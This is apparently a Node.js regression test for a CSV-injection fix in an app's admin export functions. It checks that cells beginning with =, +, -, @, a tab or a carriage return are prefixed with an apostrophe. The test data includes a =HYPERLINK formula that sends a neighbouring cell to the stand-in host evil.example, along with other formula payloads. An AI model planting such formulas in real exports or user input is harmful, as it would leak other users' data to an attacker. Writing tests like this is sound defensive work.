// Admin CSV exports never hand a spreadsheet a formula.
//
// profiles.full_name is learner-controlled (signup metadata, the profile page).
// A name such as =HYPERLINK("https://evil.example/?"&B2,"open") used to pass
// through esc() unchanged, so opening nutzer-YYYY-MM-DD.csv in Excel or Sheets
// ran it — a click sent neighbouring learners' e-mails to another host. Every
// text cell that starts with = + - @, a tab or a carriage return now gets a
// leading apostrophe (OWASP "CSV injection"), in both admin CSV writers. Real
// numbers stay numbers.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { toCsv, csvCell as directoryCell } from '../netlify/functions/admin-directory.mjs';
import { csvCell as reportCell } from '../netlify/functions/admin-reports.mjs';

const FORMULAS = ['=HYPERLINK("https://evil.example/?"&B2,"open")', '+1', '-2+3', '@cmd', '\tcmd', '\r=1+1'];

for (const [name, cell] of [['admin-directory', directoryCell], ['admin-reports', reportCell]]) {
  test(`${name}: a cell that starts like a formula is neutralised before it is quoted`, () => {
    for (const value of FORMULAS) {
      const out = cell(value);
      const unquoted = out.startsWith('"') ? out.slice(1, -1).replace(/""/g, '"') : out;
      assert.equal(unquoted, `'${value}`, `${JSON.stringify(value)} → ${out}`);
    }
    // The quoted form still escapes its quotes (the HYPERLINK case holds both a quote and a comma).
    assert.equal(cell('=SUM(A1;A2)'), `"'=SUM(A1;A2)"`);
    assert.ok(cell(FORMULAS[0]).startsWith(`"'=HYPERLINK(""`), 'quotes inside a neutralised cell are doubled');
    // Ordinary values are unchanged.
    assert.equal(cell('Anna Müller'), 'Anna Müller');
    assert.equal(cell('anna@example.com'), 'anna@example.com');
    assert.equal(cell('Weber; Anna'), '"Weber; Anna"');
    assert.equal(cell(null), '');
    assert.equal(cell(undefined), '');
    // A real number is data, never a formula: -5 stays numeric.
    assert.equal(cell(-5), '-5');
    assert.equal(cell(4900), '4900');
  });
}

test('the user directory export neutralises a learner-controlled full name', () => {
  const csv = toCsv([{ id: '00000000-0000-0000-0000-000000000001', email: 'x@example.com', fullName: '=HYPERLINK("https://evil.example/?"&B2,"open")', createdAt: '2026-10-01T00:00:00Z', access: { kind: 'free' }, grammarTopics: 0, discrepancies: 0 }]);
  const [, row] = csv.split('\n');
  const cells = row.split(';');
  assert.equal(cells[1], 'x@example.com');
  assert.ok(cells[2].startsWith(`"'=HYPERLINK(`), cells[2]);
  assert.ok(!row.split(';').some((c) => /^[=+\-@\t\r]/.test(c)), 'no cell of the export starts like a formula');
});
